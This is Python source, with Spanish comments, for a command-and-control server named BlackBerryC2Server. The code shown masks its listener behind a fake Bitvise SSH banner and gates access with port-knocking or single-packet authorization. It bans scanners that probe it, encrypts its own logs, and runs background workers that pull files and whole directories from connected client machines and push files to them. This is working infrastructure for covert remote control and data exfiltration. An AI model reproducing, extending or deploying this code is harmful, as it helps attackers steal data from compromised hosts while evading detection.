#!/usr/bin/env python3
# BlackBerryC2Server v2.0
import socket
import threading
from contextlib import contextmanager

@contextmanager
def _null_context():
    """Context manager no-op para cuando no hay send_lock disponible."""
    yield
import os
import struct
import time
import logging
import hashlib
import subprocess
import sys
import tempfile
import atexit
import shlex
import select
import json
import re
import getpass

# ── Suprimir tracebacks en consola ──────────────────────────────────────────
# Los errores completos van al log; en pantalla solo el mensaje limpio.
def _bb_excepthook(exc_type, exc_value, exc_tb):
    # Mostrar solo el tipo y mensaje, no el traceback completo
    msg = str(exc_value) if str(exc_value) else exc_type.__name__
    print(f"\033[91mBlackBerry ✗  {msg}\033[0m")
    # Guardar traceback completo en el log
    logging.critical("Excepción no capturada", exc_info=(exc_type, exc_value, exc_tb))

sys.excepthook = _bb_excepthook
# ────────────────────────────────────────────────────────────────────────────
from queue import Queue, Empty
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.asymmetric import ec, dsa, rsa
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import hmac as hmac_module
import secrets
import base64
from colores import *
from collections import defaultdict, deque
import zlib
import argparse
from datetime import datetime

# Zstandard para archivos grandes (opcional pero recomendado)
try:
    import zstandard as zstd
    ZSTD_AVAILABLE = True
except ImportError:
    ZSTD_AVAILABLE = False
    print(f"{YELLOW}[!] zstandard no disponible. Instala con: pip install zstandard{RESET}")
    print(f"{YELLOW}    (Recomendado para transferencias >1GB){RESET}")

# Importar prompt_toolkit (opcional)
try:
    from prompt_toolkit import PromptSession
    from prompt_toolkit.completion import Completer, WordCompleter, Completion, PathCompleter, merge_completers
    from prompt_toolkit.history import FileHistory
    from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
    from prompt_toolkit.styles import Style
    from prompt_toolkit.document import Document
    from prompt_toolkit.patch_stdout import patch_stdout as _pt_patch_stdout
    from prompt_toolkit.formatted_text import ANSI as PT_ANSI
    PROMPT_TOOLKIT_AVAILABLE = True
except ImportError:
    PROMPT_TOOLKIT_AVAILABLE = False
    _pt_patch_stdout = None
    PT_ANSI = None
    print(f"{ALERT} {YELLOW}prompt_toolkit no disponible, usando input() básico{RESET}")

# ==================== IMPORT DEL PROXY v2.1 ====================
import multiprocessing

try:
    from BlackBerryHTTPs_TLSProxyDaemon import BlackBerryProxy
    PROXY_AVAILABLE = True
except ImportError:
    PROXY_AVAILABLE = False
    print(f"{YELLOW}[!] BlackBerryHTTPs_TLSProxyDaemon no disponible{RESET}")

# Variables globales del proxy
tls_proxy = None  # Instancia del proxy daemon
tls_proxy_gui_process = None  # Proceso del GUI

# Variables globales para control de verbosidad
VERBOSE_MODE = 0

# Clave AES-256 para cifrar sessions.jsonl — None = texto plano
_SESSION_LOG_KEY: bytes | None = None
_SERVER_LOG_KEY:  bytes | None = None   # clave del BlackBerryC2_enc.log

ENABLE_COMPRESSION = True
COMPRESSION_LEVEL = 9
CHUNK_SIZE = 64 * 1024

# ==================== DYNAMIC FILE TRANSFER ====================
FILE_TIMEOUT_BASE = 90  
FILE_TIMEOUT_PER_MB = 20  
FILE_MAX_TIMEOUT = 7200
FILE_MIN_TIMEOUT = 45
FILE_RETRY_COUNT = 3
FILE_CHUNK_REPORT_INTERVAL = 100
FILE_VERIFICATION_RETRIES = 2
LARGE_FILE_THRESHOLD = 1024 * 1024 * 1024  # 1GB

script_dir = os.path.dirname(__file__)

tls_proxy = None

# Módulo de Detección de Escaneos y Seguridad
SCAN_WINDOW = 60
MAX_CONNECTIONS_IN_WINDOW = 20
MAX_FAILED_HANDSHAKES = 2
MAX_BANNER_GRABS = 2
TEMP_BAN_DURATION = 1000

rejection_counters = defaultdict(lambda: {'count': 0, 'last_log': 0})
rejection_lock = threading.Lock()
REJECTION_LOG_THRESHOLD = 60

connection_behavior = defaultdict(lambda: {
    'timestamps': deque(maxlen=MAX_CONNECTIONS_IN_WINDOW * 2),
    'failed_handshakes': 0,
    'banner_grabs': 0
})
behavior_lock = threading.Lock()

temp_bans = {}
temp_bans_lock = threading.Lock()

from collections import defaultdict

rejection_counters = defaultdict(lambda: {
    "count": 0,
    "suggested": False
})

def log_rejection_smart(ip, reason):
    try:
        with rejection_lock:
            # Inicializa datos por IP si no existen
            data = rejection_counters.setdefault(ip, {
                "count": 0,
                "relaxed_printed": 0,  # cuántas veces imprimió modo relajado
                "suggested": False      # si ya mostró sugerencia
            })

            # Aumenta contador
            data["count"] += 1
            count = data["count"]

            # Log interno siempre
            logging.info(f"Conexión #{count} rechazada de {ip} ({reason})")

            # ===== MODO RELAJADO =====
            if VERBOSE_MODE == 2:
                if data["relaxed_printed"] < 3:
                    print(f"Conexión #{count} rechazada de {ip} ({reason})")
                    data["relaxed_printed"] += 1
                elif data["relaxed_printed"] == 3:
                    print(f"IP {ip}: Suprimiendo logs posteriores")
                    data["relaxed_printed"] += 1  # solo imprime esta línea una vez

            # ===== MODO SILENCIOSO =====
            elif VERBOSE_MODE == 1:
                if count == 1:
                    print(f"Conexión rechazada de {ip} ({reason})")

            # ===== SUGERENCIA SOLO UNA VEZ + CADA 1000 =====
            if (not data["suggested"]) or count % 1000 == 0:
                msg = (
                    f"IP {ip} rechazada {count} veces ({reason}). "
                    f"Bloqueo sugerido: sudo iptables -A INPUT -s {ip} -j DROP"
                )
                logging.warning(msg)
                print(f"{YELLOW}{msg}{RESET}")
                data["suggested"] = True

    except Exception as e:
        logging.exception(f"Error en log_rejection_smart para {ip}: {e}")

def check_suspicious_behavior(ip):
    """Analiza el comportamiento de una IP y la bloquea temporalmente si es sospechoso."""
    try:
        with behavior_lock, temp_bans_lock:
            now = time.time()
            
            if ip in temp_bans and temp_bans[ip] > now:
                return

            behavior = connection_behavior[ip]
            
            recent_timestamps = [ts for ts in behavior['timestamps'] if now - ts <= SCAN_WINDOW]
            
            if len(recent_timestamps) > MAX_CONNECTIONS_IN_WINDOW:
                msg = f"DETECCIÓN DE ESCANEO: Posible Connect Scan/Flood desde {ip} ({len(recent_timestamps)} conexiones en {SCAN_WINDOW}s)."
                logging.warning(msg)
                temp_bans[ip] = now + TEMP_BAN_DURATION
                logging.error(f"SEGURIDAD: IP {ip} bloqueada temporalmente por {TEMP_BAN_DURATION} segundos.")
                behavior['timestamps'].clear()
                behavior['failed_handshakes'] = 0
                behavior['banner_grabs'] = 0
                return

            if behavior['failed_handshakes'] > MAX_FAILED_HANDSHAKES:
                msg = f"DETECCIÓN DE ESCANEO: Posible escaneo de protocolo desde {ip} ({behavior['failed_handshakes']} handshakes fallidos)."
                logging.warning(msg)
                temp_bans[ip] = now + TEMP_BAN_DURATION
                logging.error(f"SEGURIDAD: IP {ip} bloqueada temporalmente por {TEMP_BAN_DURATION} segundos.")
                behavior['timestamps'].clear()
                behavior['failed_handshakes'] = 0
                return
                
            if behavior['banner_grabs'] > MAX_BANNER_GRABS:
                msg = f"DETECCIÓN DE ESCANEO: Posible Banner Grabbing desde {ip} ({behavior['banner_grabs']} desconexiones tras recibir banner)."
                logging.warning(msg)
                temp_bans[ip] = now + TEMP_BAN_DURATION
                logging.error(f"SEGURIDAD: IP {ip} bloqueada temporalmente por {TEMP_BAN_DURATION} segundos.")
                behavior['timestamps'].clear()
                behavior['banner_grabs'] = 0
                return
    except Exception as e:
        logging.exception(f"Error en check_suspicious_behavior para {ip}: {e}")

connection_attempts = defaultdict(lambda: deque(maxlen=10))
MAX_ATTEMPTS = 5
WINDOW_TIME = 10

blocked_ips = set()
BLOCKED_IPS_FILE = os.path.join(script_dir, "blacklist_ips.json")
blocked_ips_lock = threading.Lock()

SERVICE_BANNER = "SSH-2.0-9.39 FlowSsh: Bitvise SSH Server (WinSSHD) 9.39: free only for personal non-commercial use"
SERVICE_BANNER_FILE = os.path.join(script_dir, "sVbanner.txt")

# ==================== SECURITY HARDENING CONSTANTS ====================
# Protección contra downgrade criptográfico
MIN_AES_KEY_SIZE = 32  # Rechazar claves AES menores a 256 bits (AES-256)

# ==================== HMAC CLIENT AUTHENTICATION ====================
# Token pre-compartido para autenticar clientes en el handshake ECDHE.
# Se genera aleatoriamente en cada inicio (12 chars hex). Pasar al cliente con --hmac
HMAC_PRE_SHARED_SECRET: bytes = secrets.token_bytes(20)  # 20 bytes → token hex de 40 chars
NO_SECURE_MODE = False  # Si True, acepta cualquier cliente ECDHE sin verificar HMAC

# Protección contra DoS
MAX_MESSAGE_SIZE = 10 * 1024 * 1024  # 10MB máximo por mensaje

# Protección contra heartbeat flood  
HEARTBEAT_MIN_INTERVAL = 3.0  # Mínimo 3 segundos entre heartbeats

# Protección contra timing attacks
RESPONSE_JITTER_MIN_MS = 10  # Jitter mínimo en milisegundos
RESPONSE_JITTER_MAX_MS = 50  # Jitter máximo en milisegundos

# ==================== PASSPHRASE PARA CLAVE PERSISTENTE ====================
# Se pide en tiempo de arranque cuando se usa -p; nunca se almacena en disco.
ECDHE_KEY_PASSPHRASE: bytes | None = None  # se rellena en main()

# ==================== SPA / PORT-KNOCKING ====================
# Dos modos (configurados por argumentos):
#
#   "spa"   → un solo paquete UDP firmado con HMAC-SHA256
#             token = HMAC(HMAC_SECRET, f"{ip}:{ventana_30s}")
#             Anti-replay por ventana de tiempo + dedup en memoria
#
#   "knock" → secuencia de puertos UDP en orden estricto dentro de N segundos
#             Si la secuencia se completa, la IP queda autorizada
#
# En ambos modos, la IP autorizada tiene un TTL de SPA_AUTHZ_TTL segundos.
# Si SPA_ENABLED=False, no se aplica ningún control de pre-autenticación.

SPA_ENABLED         = False          # se activa con --spa
SPA_MODE            = "spa"          # "spa" | "knock"
SPA_UDP_PORT        = 7331           # puerto UDP donde escucha el daemon SPA
KNOCK_SEQUENCE      = [7001, 7002, 7003]   # puertos para modo knock (configurable)
KNOCK_TIMEOUT       = 10.0           # segundos para completar la secuencia
SPA_AUTHZ_TTL       = 60             # segundos que la IP queda autorizada tras knock/spa

# ==================== BERRYTRANSFER MODE ====================
# Modo transfer-only tipo scp. Solo activo cuando el servidor
# arranca con --berrytransfer. Los clientes normales son rechazados.
BERRYTRANSFER_MODE     = False
BERRYTRANSFER_ROOT     = "./berry_transfers"
BT_AUTO_CONFIRM        = False   # --auto-confirm: aprueba descargas automáticamente

# ── Sistema de confirmación de descargas ─────────────────────
# Cada GET del cliente crea una entrada aquí; el operador
# escribe "confirm <ID>" o "deny <ID>" en la shell BT.
import threading as _bt_threading
bt_pending_confirms: dict  = {}   # ID -> {"event","approved","ip","filename","size"}
bt_pending_lock            = _bt_threading.Lock()
bt_confirm_counter_val     = 0
bt_confirm_counter_lock    = _bt_threading.Lock()

def _bt_next_confirm_id() -> str:
    global bt_confirm_counter_val
    with bt_confirm_counter_lock:
        bt_confirm_counter_val += 1
        return f"DL{bt_confirm_counter_val}"

# ── Log de transferencias ────────────────────────────────────
# Formato CSV-like con columnas fijas para fácil lectura y parseo:
#   TIMESTAMP | OP | STATUS | IP | HOST | FILE | SIZE | SPEED | ELAPSED | NOTE
# ── Ruta del log de transferencias BerryTransfer ────────────────────────────
# Siempre en logs/ (mismo directorio que sessions.jsonl y BlackBerryC2_enc.log)
BT_LOG_PATH = os.path.join(script_dir, "logs", "bt_transfer.jsonl")


def bt_log_transfer(direction: str, ip: str, hostname: str,
                    filename: str, size: int, ok: bool, extra: str = "",
                    elapsed: float = 0.0):
    """
    Guarda un evento de transferencia en logs/bt_transfer.jsonl.

    Formato de cada línea: JSON compacto (una entrada por línea = JSONL).
    Si _SESSION_LOG_KEY está activo cada línea se cifra con AES-256-GCM antes
    de escribirse — idéntico al mecanismo de sessions.jsonl.

    Campos del registro:
      ts        – timestamp ISO  "2026-02-23 21:39:13"
      op        – "GET" | "PUT"
      status    – "OK" | "FAIL" | "DENY" | "CANC" | "404"
      ip        – IP del cliente
      host      – hostname del cliente
      file      – nombre del archivo / directorio
      size      – tamaño en bytes  (-1 = desconocido)
      elapsed   – segundos de transferencia  (0.0 = N/A)
      speed_bps – bytes/s  (-1 = N/A)
      note      – nota libre  (extra)
    """
    try:
        log_path = BT_LOG_PATH
        os.makedirs(os.path.dirname(log_path), exist_ok=True)

        if ok:
            status = "OK"
        elif extra in ("denied", "operator_denied", "denied_or_timeout"):
            status = "DENY"
        elif extra == "not_found":
            status = "404"
        elif extra == "cancelled":
            status = "CANC"
        else:
            status = "FAIL"

        speed_bps = int(size / elapsed) if (ok and elapsed > 0 and size > 0) else -1

        rec = {
            "ts":        datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "op":        "GET" if direction == "download" else "PUT",
            "status":    status,
            "ip":        ip,
            "host":      hostname,
            "file":      filename,
            "size":      size if size > 0 else -1,
            "elapsed":   round(elapsed, 2) if elapsed > 0 else 0.0,
            "speed_bps": speed_bps,
            "note":      extra if extra else "-",
        }
        line = json.dumps(rec, ensure_ascii=False)

        # ── Cifrado AES-256-GCM si hay clave activa ──────────────────────────
        if _SESSION_LOG_KEY:
            _nonce = secrets.token_bytes(12)
            _ciph  = AESGCM(_SESSION_LOG_KEY).encrypt(_nonce, line.encode('utf-8'), None)
            line   = base64.b64encode(_nonce + _ciph).decode('ascii')

        with open(log_path, 'a', encoding='utf-8') as f:
            f.write(line + "\n")

    except Exception as e:
        logging.debug(f"[BerryTransfer] bt_log_transfer error: {e}")

# ============================================================

# Estado en memoria (thread-safe)
spa_authorized_ips: dict[str, float] = {}   # ip -> expiry_timestamp
spa_authz_lock  = threading.Lock()
spa_used_tokens: dict = {}               # anti-replay: {token_key: timestamp}
spa_tokens_lock = threading.Lock()
knock_partial: dict[str, dict] = {}        # ip -> {idx, ts} progreso knock
knock_partial_lock = threading.Lock()

# ============================================================
#  BACKGROUND TRANSFER MANAGER
# ============================================================

class BackgroundTransfer:
    """Representa una transferencia de archivo en background."""

    def __init__(self, tid: str, direction: str, session_cid: int,
                 remote_name: str, local_path: str):
        self.id             = tid           # "T1", "T2", …
        self.direction      = direction     # "get" | "put"
        self.session_cid    = session_cid
        self.remote_name    = remote_name   # ruta en el cliente
        self.local_path     = local_path    # ruta local final
        self.partial_path   = local_path + ".partial"   # fichero temporal
        self.resume_file    = local_path + ".resume"    # JSON con metadatos
        self.total_bytes    = 0
        self.bytes_done     = 0
        self.status         = "pending"     # pending|running|done|failed|cancelled
        self.start_time: float | None = None
        self.end_time:   float | None = None
        self.thread:     threading.Thread | None = None
        self.cancel_evt  = threading.Event()
        self.error: str | None = None

    # ── helpers ──────────────────────────────────────────────

    def speed_str(self) -> str:
        if not self.start_time or not self.bytes_done:
            return "—"
        elapsed = (self.end_time or time.time()) - self.start_time
        if elapsed <= 0:
            return "—"
        return format_speed(self.bytes_done / elapsed)

    def eta_str(self) -> str:
        if not self.start_time or self.total_bytes <= 0:
            return "—"
        elapsed = time.time() - self.start_time
        if elapsed <= 0 or self.bytes_done <= 0:
            return "—"
        rate = self.bytes_done / elapsed
        return estimate_time_remaining(self.total_bytes - self.bytes_done, rate)

    def pct(self) -> float:
        if self.total_bytes <= 0:
            return 0.0
        return min(100.0, self.bytes_done / self.total_bytes * 100)

    def status_line(self) -> str:
        """Línea de resumen para el comando 'transfers'."""
        direction_arrow = "⬇ GET" if self.direction == "get" else "⬆ PUT"
        name = os.path.basename(self.remote_name)
        sz   = f"{format_bytes(self.bytes_done)}/{format_bytes(self.total_bytes)}"
        if self.status == "running":
            bar_w  = 20
            filled = int(bar_w * self.pct() / 100)
            bar    = "█" * filled + "░" * (bar_w - filled)
            return (f"  [{self.id}] #{self.session_cid} {direction_arrow} {name}"
                    f"  |{bar}| {self.pct():.0f}%  {sz}"
                    f"  {self.speed_str()}  ETA {self.eta_str()}")
        elif self.status == "done":
            elapsed = (self.end_time or time.time()) - (self.start_time or time.time())
            return (f"  [{self.id}] #{self.session_cid} {direction_arrow} {name}"
                    f"  ✓ {format_bytes(self.total_bytes)}"
                    f"  en {elapsed:.1f}s  ({self.speed_str()})")
        elif self.status == "failed":
            return (f"  [{self.id}] #{self.session_cid} {direction_arrow} {name}"
                    f"  ✗ {self.error or 'error desconocido'}")
        elif self.status == "cancelled":
            return (f"  [{self.id}] #{self.session_cid} {direction_arrow} {name}"
                    f"  ⊘ cancelado  ({format_bytes(self.bytes_done)} transferidos)")
        return f"  [{self.id}] #{self.session_cid} {direction_arrow} {name}  ({self.status})"

    def save_resume_meta(self):
        """Guarda metadatos de reanudación."""
        try:
            meta = {
                "id":          self.id,
                "direction":   self.direction,
                "session_cid": self.session_cid,
                "remote_name": self.remote_name,
                "local_path":  self.local_path,
                "total_bytes": self.total_bytes,
                "bytes_done":  self.bytes_done,
                "timestamp":   time.time(),
            }
            with open(self.resume_file, 'w') as f:
                json.dump(meta, f, indent=2)
        except Exception as e:
            logging.debug(f"[BG] Error guardando .resume: {e}")

    def load_resume_offset(self) -> int:
        """Devuelve el offset para reanudar (0 si no hay fichero parcial)."""
        try:
            if os.path.exists(self.partial_path):
                return os.path.getsize(self.partial_path)
        except Exception:
            pass
        return 0

    def cleanup_resume_files(self):
        for path in (self.partial_path, self.resume_file):
            try:
                if os.path.exists(path):
                    os.remove(path)
            except Exception:
                pass


# Estado global de transferencias en background
_bg_transfers: dict[str, BackgroundTransfer] = {}
_bg_transfers_lock = threading.Lock()
_bg_transfer_counter = 0
_bg_counter_lock = threading.Lock()

# ── Cola thread-safe para mensajes de workers en segundo plano ────────────
# Usada cuando patch_stdout NO está activo (fallback input() básico).
_bg_log_queue: Queue = Queue(maxsize=500)

def bg_print(msg: str) -> None:
    """
    Print thread-safe desde workers de background.
    - Con prompt_toolkit activo: print() directo (patch_stdout lo maneja).
    - Sin prompt_toolkit: encola para que interactive_shell lo muestre antes del prompt.
    """
    if PROMPT_TOOLKIT_AVAILABLE:
        # patch_stdout (activo dentro de interactive_shell) intercepta sys.stdout
        # y muestra el mensaje ENCIMA del prompt sin corromperlo.
        print(msg)
    else:
        try:
            _bg_log_queue.put_nowait(msg)
        except Exception:
            pass  # Cola llena: descartar antes que bloquear el worker

def _drain_bg_log() -> None:
    """Drena y muestra mensajes en cola. Solo para el fallback sin prompt_toolkit."""
    while True:
        try:
            msg = _bg_log_queue.get_nowait()
            print(msg)
        except Exception:
            break


def _bg_next_id() -> str:
    global _bg_transfer_counter
    with _bg_counter_lock:
        _bg_transfer_counter += 1
        return f"T{_bg_transfer_counter}"


def bg_register(xfer: BackgroundTransfer):
    with _bg_transfers_lock:
        _bg_transfers[xfer.id] = xfer


def bg_get(tid: str) -> BackgroundTransfer | None:
    with _bg_transfers_lock:
        return _bg_transfers.get(tid)


def bg_all() -> list[BackgroundTransfer]:
    with _bg_transfers_lock:
        return list(_bg_transfers.values())


def _bg_get_worker(xfer: BackgroundTransfer, session):
    """
    Worker para GET en background.
    Usa bg_get_lock para serializar — solo un GET activo por sesión.
    """
    sock    = session.socket
    aes_key = session.aes_key

    xfer.status     = "running"
    xfer.start_time = time.time()

    acquired = session.bg_get_lock.acquire(timeout=FILE_MAX_TIMEOUT)
    if not acquired:
        xfer.status = "failed"
        xfer.error  = "No se pudo adquirir bg_get_lock"
        bg_print(f"\n\033[91m[{xfer.id}] ✗ GET '{xfer.remote_name}' — otra transferencia activa bloqueó el inicio\033[0m")
        return

    try:
        local_path = xfer.local_path

        # ── Preparar destino y evento ────────────────────────────────────
        session.file_error         = None
        session.expected_file      = os.path.basename(xfer.remote_name)
        session.expected_file_dest = local_path
        session.file_event.clear()
        session.file_result = None

        # ── Enviar GET_FILE al cliente ───────────────────────────────────
        cmd = f"GET_FILE {xfer.remote_name}"
        if not send_encrypted_message(sock, cmd, aes_key, timeout=10, session=session):
            raise RuntimeError("No se pudo enviar GET_FILE al cliente")

        # ── Esperar resultado de handle_client ───────────────────────────
        if not session.file_event.wait(timeout=FILE_MAX_TIMEOUT):
            raise RuntimeError(f"Timeout esperando respuesta del cliente")

        if not session.file_result:
            err = getattr(session, 'file_error', None) or "Transferencia fallida"
            raise RuntimeError(err)

        # ── Éxito ────────────────────────────────────────────────────────
        xfer.status   = "done"
        xfer.end_time = time.time()
        elapsed       = xfer.end_time - xfer.start_time
        try:
            size = os.path.getsize(xfer.local_path)
        except Exception:
            size = 0
        xfer.total_bytes = size
        xfer.bytes_done  = size
        avg_speed = size / elapsed if elapsed > 0 else 0

        bg_print(f"\n\033[92m[{xfer.id}] ✓ GET '{os.path.basename(xfer.remote_name)}' completado "
                 f"— {format_bytes(size)} en {elapsed:.1f}s "
                 f"({format_speed(avg_speed)}) → {xfer.local_path}\033[0m")

    except Exception as e:
        xfer.status   = "failed"
        xfer.error    = str(e)
        xfer.end_time = time.time()
        bg_print(f"\n\033[91m[{xfer.id}] ✗ GET '{xfer.remote_name}' falló — {e}\033[0m")
        logging.error(f"[BG-GET {xfer.id}] Error: {e}")

    finally:
        session.expected_file      = None
        session.expected_file_dest = None
        session.file_error         = None
        session.bg_get_lock.release()


def _bg_put_worker(xfer: BackgroundTransfer, session):
    """
    Worker para PUT en background.
    PUT solo ESCRIBE al socket (no lee), por lo que no compite con
    handle_client que solo lee. No necesita transfer_hijack.
    Envía SIZE + chunks directamente; espera confirmación via response_queue.
    """
    sock    = session.socket
    aes_key = session.aes_key

    xfer.status     = "running"
    xfer.start_time = time.time()

    try:
        if not os.path.isfile(xfer.local_path):
            raise RuntimeError(f"Archivo no encontrado: {xfer.local_path}")

        xfer.total_bytes = os.path.getsize(xfer.local_path)
        timeout_dyn      = calculate_file_timeout(xfer.total_bytes)

        # Calcular hash del archivo
        sha = hashlib.sha256()
        with open(xfer.local_path, 'rb') as fh:
            for chunk in iter(lambda: fh.read(65536), b""):
                sha.update(chunk)
        file_hash = sha.hexdigest()

        # Enviar header SIZE
        header = f"SIZE {xfer.total_bytes} {file_hash}"
        if not send_encrypted_message(sock, header, aes_key,
                                      timeout=timeout_dyn, session=session):
            raise RuntimeError("Error enviando header SIZE")

        # ── Enviar chunks ─────────────────────────────────────
        bytes_sent = 0
        with open(xfer.local_path, 'rb') as fh:
            while True:
                if xfer.cancel_evt.is_set():
                    xfer.status   = "cancelled"
                    bg_print(f"\n\033[93m[{xfer.id}] ⊘ PUT '{os.path.basename(xfer.local_path)}' cancelado "
                          f"({format_bytes(bytes_sent)} enviados)\033[0m")
                    return

                chunk = fh.read(CHUNK_SIZE)
                if not chunk:
                    break

                flag  = 0
                data  = chunk
                try:
                    comp = zlib.compress(chunk, level=COMPRESSION_LEVEL)
                    if len(comp) < len(chunk):
                        data  = comp
                        flag  = 1
                except Exception:
                    pass

                aesgcm = AESGCM(aes_key)
                nonce  = os.urandom(12)
                ct     = aesgcm.encrypt(nonce, data, None)
                packet = bytes([flag]) + nonce + ct
                full   = struct.pack('!I', len(packet)) + packet

                sock.settimeout(timeout_dyn)
                sock.sendall(full)

                bytes_sent      += len(chunk)
                xfer.bytes_done  = bytes_sent

        # Esperar confirmación del cliente via response_queue (handle_client la leerá)
        try:
            conf = session.response_queue.get(timeout=60)
        except Exception:
            conf = None

        xfer.status   = "done"
        xfer.end_time = time.time()
        elapsed       = xfer.end_time - xfer.start_time
        avg_speed     = bytes_sent / elapsed if elapsed > 0 else 0

        bg_print(f"\n\033[92m[{xfer.id}] ✓ PUT '{os.path.basename(xfer.local_path)}' completado "
              f"— {format_bytes(bytes_sent)} en {elapsed:.1f}s "
              f"({format_speed(avg_speed)})\033[0m")
        if conf:
            bg_print(f"\033[92m[{xfer.id}] Confirmación: {conf.strip()}\033[0m")

    except Exception as e:
        xfer.status   = "failed"
        xfer.error    = str(e)
        xfer.end_time = time.time()
        bg_print(f"\n\033[91m[{xfer.id}] ✗ PUT '{xfer.remote_name}' falló — {e}\033[0m")
        logging.error(f"[BG-PUT {xfer.id}] Error: {e}")


def bg_start_get(session, cid: int, remote_name: str, local_path: str) -> BackgroundTransfer:
    """Crea y arranca una transferencia GET en background."""
    tid  = _bg_next_id()
    xfer = BackgroundTransfer(tid, "get", cid, remote_name, local_path)
    bg_register(xfer)
    t = threading.Thread(
        target=_bg_get_worker,
        args=(xfer, session),
        daemon=True,
        name=f"BB-BG-GET-{tid}"
    )
    xfer.thread = t
    t.start()
    return xfer


def bg_start_put(session, cid: int, local_path: str, remote_name: str) -> BackgroundTransfer:
    """Crea y arranca una transferencia PUT en background."""
    tid  = _bg_next_id()
    xfer = BackgroundTransfer(tid, "put", cid, remote_name, local_path)
    bg_register(xfer)
    t = threading.Thread(
        target=_bg_put_worker,
        args=(xfer, session),
        daemon=True,
        name=f"BB-BG-PUT-{tid}"
    )
    xfer.thread = t
    t.start()
    return xfer


def bg_cancel(tid: str) -> bool:
    """Cancela una transferencia por ID. Devuelve True si existía y estaba activa."""
    xfer = bg_get(tid)
    if not xfer:
        return False
    if xfer.status == "running":
        xfer.cancel_evt.set()
        return True
    return False


# ──────────────────────────────────────────────────────────────────────────
# WORKER RECURSIVO EN BACKGROUND (usa transfer_hijack completo)
# ──────────────────────────────────────────────────────────────────────────

def _bg_recursive_worker(xfer_stub: BackgroundTransfer, session,
                         remote_files: list, local_base: str, target_norm: str):
    """
    Worker para descarga recursiva. Usa bg_get_lock para serializar —
    solo un GET activo por sesión; evita que dos workers pisen expected_file_dest.
    """
    sock    = session.socket
    aes_key = session.aes_key
    tid     = xfer_stub.id
    total   = len(remote_files)

    downloaded  = 0
    failed      = 0
    failed_list = []

    xfer_stub.status      = "running"
    xfer_stub.start_time  = time.time()
    xfer_stub.total_bytes = total

    acquired = session.bg_get_lock.acquire(timeout=60)
    if not acquired:
        xfer_stub.status = "failed"
        xfer_stub.error  = "Otra descarga activa bloquea el inicio"
        bg_print(f"\n\033[91m[{xfer_stub.id}] ✗ Recursivo abortado — otra descarga GET activa en esta sesión\033[0m")
        return

    try:
        for idx, remote_file in enumerate(remote_files, 1):

            # ── Cancelación ──────────────────────────────────────────────────
            if xfer_stub.cancel_evt.is_set():
                bg_print(f"\n\033[93m[{tid}] ⊘ Recursivo cancelado "
                         f"({downloaded}/{total} completados)\033[0m")
                xfer_stub.status   = "cancelled"
                xfer_stub.end_time = time.time()
                return

            # ── Calcular ruta local ──────────────────────────────────────────
            if (remote_file.startswith(target_norm + '/') or
                    remote_file.startswith(target_norm + os.sep)):
                rel_path = remote_file[len(target_norm):].lstrip('/\\')
            else:
                rel_path = os.path.relpath(remote_file, target_norm)
            if rel_path.startswith('..'):
                rel_path = os.path.basename(remote_file)

            local_file = os.path.join(local_base, rel_path)
            try:
                os.makedirs(os.path.dirname(local_file), exist_ok=True)
            except Exception:
                pass

            # ── Descargar via file_event (sin hijack) ────────────────────────
            try:
                session.file_error         = None
                session.expected_file      = os.path.basename(local_file)
                session.expected_file_dest = local_file
                session.file_event.clear()
                session.file_result = None

                if not send_encrypted_message(sock, f"GET_FILE {remote_file}",
                                              aes_key, timeout=10, session=session):
                    raise RuntimeError("No se pudo enviar GET_FILE")

                dyn_timeout = FILE_MAX_TIMEOUT

                if not session.file_event.wait(timeout=dyn_timeout):
                    raise RuntimeError(f"Timeout esperando {rel_path}")

                if not session.file_result:
                    err = getattr(session, 'file_error', None) or f"Transferencia fallida"
                    raise RuntimeError(err)

                downloaded += 1
                xfer_stub.bytes_done = downloaded

            except Exception as e:
                if xfer_stub.cancel_evt.is_set():
                    bg_print(f"\n\033[93m[{tid}] ⊘ Recursivo cancelado "
                             f"({downloaded}/{total} completados)\033[0m")
                    xfer_stub.status   = "cancelled"
                    xfer_stub.end_time = time.time()
                    return
                failed_list.append(rel_path)
                failed += 1
                logging.warning(f"[{tid}] ✗ {rel_path}: {e}")
                try:
                    if os.path.exists(local_file):
                        os.remove(local_file)
                except Exception:
                    pass

            finally:
                session.expected_file      = None
                session.expected_file_dest = None
                session.file_error         = None

        # ── Resumen final ────────────────────────────────────────────────────
        xfer_stub.end_time = time.time()
        elapsed = xfer_stub.end_time - xfer_stub.start_time

        if failed == 0:
            xfer_stub.status = "done"
            bg_print(f"\n\033[92m[{tid}] ✓ Recursivo completado: "
                     f"{downloaded}/{total} archivos en {elapsed:.1f}s "
                     f"→ {local_base}\033[0m")
        else:
            xfer_stub.status = "failed"
            bg_print(f"\n\033[93m[{tid}] ⚠ Recursivo completado con errores: "
                     f"{downloaded} ok / {failed} fallidos en {elapsed:.1f}s "
                     f"→ {local_base}\033[0m")
            if failed_list:
                bg_print(f"\033[91m[{tid}] Fallidos: "
                         + ", ".join(failed_list[:10])
                         + ("..." if len(failed_list) > 10 else "")
                         + "\033[0m")

    except Exception as e:
        xfer_stub.status   = "failed"
        xfer_stub.error    = str(e)
        xfer_stub.end_time = time.time()
        bg_print(f"\n\033[91m[{tid}] ✗ Descarga recursiva falló: {e}\033[0m")
        logging.error(f"[BG-RECUR {tid}] Error: {e}")

    finally:
        session.expected_file      = None
        session.expected_file_dest = None
        if acquired:
            session.bg_get_lock.release()






def print_transfers(show_done=True):
    """Imprime la tabla de transferencias activas y recientes."""
    all_xfers = bg_all()
    if not all_xfers:
        print(f"\033[93m  Sin transferencias registradas\033[0m")
        return

    running   = [x for x in all_xfers if x.status == "running"]
    done      = [x for x in all_xfers if x.status in ("done", "failed", "cancelled")]

    if running:
        print(f"\033[96m  ── En progreso ─────────────────────────────────────────\033[0m")
        for x in running:
            print(f"\033[96m{x.status_line()}\033[0m")

    if show_done and done:
        print(f"\033[90m  ── Completadas ──────────────────────────────────────────\033[0m")
        for x in done[-10:]:   # Mostrar solo las últimas 10
            color = "\033[92m" if x.status == "done" else ("\033[91m" if x.status == "failed" else "\033[93m")
            print(f"{color}{x.status_line()}\033[0m")

    if not running and not done:
        print(f"\033[93m  Sin transferencias\033[0m")


